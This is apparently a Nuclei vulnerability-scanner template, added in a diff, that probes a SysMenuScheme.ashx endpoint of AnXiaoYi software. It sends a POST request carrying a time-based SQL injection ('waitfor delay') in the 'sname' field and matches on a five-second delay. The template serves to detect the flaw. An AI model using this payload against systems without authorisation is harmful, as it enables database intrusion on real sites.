@@ -1,0 +1,27 @@
+id: AnXiaoYi-SysMenuScheme-sqlInjection
+
+info:
+  name: AnXiaoYi-SysMenuScheme-sqlInjection
+  author: iSee857
+  severity: high
+  description: AnXiaoYi-SysMenuScheme-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /Module/Kernel/Controller/SysMenuScheme.ashx HTTP/1.1
+        Host: {{Host}}
+        Content-type:application/x-www-form-urlencoded
+
+        action=exportExcel&sname='waitfor+delay'0:0:5'--
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
